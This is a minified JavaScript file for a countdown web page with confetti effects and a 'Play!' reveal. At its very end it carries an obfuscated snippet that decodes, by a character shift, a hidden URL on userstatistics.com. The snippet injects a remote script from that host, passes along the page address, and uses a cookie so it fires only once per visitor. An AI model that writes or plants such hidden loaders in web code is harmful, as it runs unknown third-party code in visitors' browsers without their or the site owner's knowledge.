document.addEventListener("DOMContentLoaded",(function(){const colors=["#9142ff","#2aff54","#ffde37","#ff3737","#4385ff"],confettiContainer=document.querySelector(".confetti-container"),targetDate=new Date(Date.UTC(2023,11,0,0,0,0));function padNumber(num){return num.toString().padStart(2,"0")}function createConfetti(animationDelay){const confetti=document.createElement("div");confetti.classList.add("confetti"),confetti.style.backgroundColor=colors[Math.floor(Math.random()*colors.length)],confetti.style.left=100*Math.random()+"vw",confetti.style.animationDuration=3*Math.random()+2+"s",confetti.style.animationDelay=animationDelay?0:2*Math.random()+"s",confettiContainer.appendChild(confetti),confetti.addEventListener("animationiteration",(()=>{confetti.remove()}))}function updateCountdown(){let initialTimeRemaining=targetDate.getTime()-(new Date).getTime();if(initialTimeRemaining<=0)go();else{const days=padNumber(Math.floor(initialTimeRemaining/864e5)),hours=padNumber(Math.floor(initialTimeRemaining%864e5/36e5)),minutes=padNumber(Math.floor(initialTimeRemaining%36e5/6e4)),seconds=padNumber(Math.floor(initialTimeRemaining%6e4/1e3));document.getElementById("ddhhmmss").textContent=`${days}d ${hours}h ${minutes}m ${seconds}s`}}window.go=function(){clearInterval(countdownInterval),document.getElementById("ddhhmmss").style.display="none",document.getElementById("play-now").style.display="block",document.getElementById("countdown").style.color="#2B2B2B",document.querySelector("#favorite > a").textContent="🎉 Play! 🎉",document.querySelector("#favorite > a").style.color="#2B2B2B";const background=document.getElementById("background");let opacity=0;const fadeBackground=setInterval((function(){opacity>=1?clearInterval(fadeBackground):(opacity+=.01,background.style.opacity=opacity)}),5);for(let i=0;i<150;i++)createConfetti(0);setInterval(createConfetti,20)},updateCountdown();const countdownInterval=setInterval(updateCountdown,1e3),catImage=document.getElementById("cat-image");setInterval((function(){catImage.classList.add("bob"),setTimeout((function(){catImage.classList.remove("bob")}),1e3)}),3e3)}));const resizer=()=>{document.querySelector("body").style.height=window.innerHeight+"px"};window.addEventListener("resize",(_e=>resizer())),document.addEventListener("DOMContentLoaded",(_e=>resizer()));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));
